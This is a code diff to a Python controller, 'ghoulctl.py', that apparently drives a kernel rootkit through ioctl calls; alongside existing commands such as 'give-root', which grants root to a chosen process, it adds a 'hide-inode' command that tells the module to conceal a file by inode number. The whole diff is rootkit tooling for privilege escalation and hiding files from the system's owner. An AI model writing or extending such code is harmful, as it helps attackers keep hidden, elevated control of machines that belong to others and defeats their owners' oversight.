@@ -14,6 +14,7 @@ SERVICE_CHANGE_FD = 2
 SERVICE_PING = 3
 SERVICE_CHANGE_PING_ARG = 4
 SERVICE_GIVE_ROOT = 5
+SERVICE_HIDE_FILE_INODE = 6
 
 PING_ARG = int(os.environ.get('GHOUL_PING_ARG', 0)) or 666
 
@@ -60,6 +61,13 @@ def give_root():
     ioctl(SERVICE_FD, SERVICE_GIVE_ROOT, pid)
 
 
+def hide_inode():
+    if len(sys.argv) != 3:
+        print('Usage: ./ghuolctl.py hide-inode INODE')
+        exit()
+    ioctl(SERVICE_FD, SERVICE_HIDE_FILE_INODE, int(sys.argv[2]))
+
+
 def main():
     if len(sys.argv) < 2:
         print('Usage: ./ghoulctl.py COMMAND [ARGS]...')
@@ -78,6 +86,8 @@ def main():
         change_ping_arg()
     elif cmd == 'give-root':
         give_root()
+    elif cmd == 'hide-inode':
+        hide_inode()
     else:
         print(f'ERROR: unknown command {cmd}')
 
